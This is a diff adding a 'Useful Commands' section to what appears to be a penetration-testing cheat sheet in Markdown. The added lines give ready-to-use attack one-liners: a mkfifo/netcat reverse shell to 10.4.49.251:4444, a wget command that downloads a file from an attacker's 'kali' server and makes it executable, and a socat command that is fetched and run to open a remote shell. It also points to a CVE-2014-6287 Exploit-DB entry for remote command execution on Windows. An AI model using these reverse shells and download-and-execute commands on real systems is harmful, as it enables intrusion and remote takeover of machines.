@@ -31,8 +31,23 @@
 - [SMTP](smtp.md)
 - [MySQL](mysql.md)
 
-## Windows
+## Useful Commands
+Generate shell payload
+```
+echo "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.4.49.251 4444 >/tmp/f" > shell.sh
+```
 
+Download file from local Web server on kali
+```
+export dlfile=[FILE NAME]; wget http://10.4.49.251/${dlfile} -O /tmp/${dlfile}; chmod +x /tmp/${dlfile}
+```
+
+Download Socat and execute it from local Web server on kali
+```
+wget http://10.4.49.251/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.4.49.251:4444
+```
+
+## Exploit DB (Windows)
 ### CVE : 2014-6287 ([39161](https://www.exploit-db.com/exploits/39161))
 You can execute arbitrary commands on the remote Windows host.
 
@@ -120,3 +135,6 @@ https://crackstation.net/
 
 Hash Analyzer  
 https://www.tunnelsup.com/hash-analyzer/
+
+Upgrading Simple Shells to Fully Interactive TTYs
+https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
